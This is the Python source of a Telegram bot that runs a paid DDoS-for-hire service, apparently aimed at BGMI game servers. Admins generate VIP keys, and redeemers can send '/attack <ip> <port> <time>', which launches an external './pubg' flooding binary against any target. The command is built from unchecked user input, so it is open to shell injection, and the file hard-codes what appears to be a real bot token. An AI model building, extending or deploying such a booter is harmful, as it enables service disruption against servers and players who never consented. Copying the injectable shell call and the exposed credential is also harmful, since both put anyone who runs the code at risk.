import asyncio
import random
import string
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

# Bot Credentials
TELEGRAM_BOT_TOKEN = '7675437323:AAGqGH5mhWMUbjpoFuF2I2offywpY2Ayay0'
ADMIN_USER_ID = 7129010361  # अपने टेलीग्राम ID से बदलो
USERS_FILE = 'users.txt'
KEYS_FILE = 'keys.txt'
attack_in_progress = False

# Load Users & Keys
def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

def load_keys():
    try:
        with open(KEYS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_keys(keys):
    with open(KEYS_FILE, 'w') as f:
        f.writelines(f"{key}\n" for key in keys)

keys = load_keys()

# Start Command
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome To 💸[RAVI]🚀 DDOS*\n"
        "*🔥 Owner @R_SDanger*\n"
        "*🔥 SERVER BGMI*\n"
        "*🔥 Use /attack To Start Attack*\n"
        "*🔥 Generate VIP Key: /genkey*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Generate & Redeem Key
async def genkey(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only Admin Can Generate Keys!*", parse_mode='Markdown')
        return

    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    keys.add(key)
    save_keys(keys)
    await context.bot.send_message(chat_id=chat_id, text=f"*🔑 New VIP Key: `{key}`*", parse_mode='Markdown')

async def redeem(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /redeem <key>*", parse_mode='Markdown')
        return

    key = args[0].strip()

    if key in keys:
        keys.remove(key)
        save_keys(keys)
        users.add(user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text="*✅ VIP Access Granted!*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid Key!*", parse_mode='Markdown')

# Attack System
async def run_attack(chat_id, ip, port, time, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./pubg {ip} {port} {time} 100",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text=(
            f"✅ **Attack Completed!** ✅\n"
            f"🔥 **Owner: @R_SDanger**\n"
            f"🔥 **Server: BGMI**"
        ), parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*❌ VIP Access Required! Use /redeem*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip> <port> <time>*", parse_mode='Markdown')
        return

    ip, port, time = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"🚀 **Attack Launched!** 🚀\n"
        f"🎯 **Target:** `{ip}`\n"
        f"🔥 **Port:** `{port}`\n"
        f"⏳ **Duration:** `{time} seconds`\n"
        f"💀 **Powered By @R_SDanger**"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, time, context))

# Main Function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()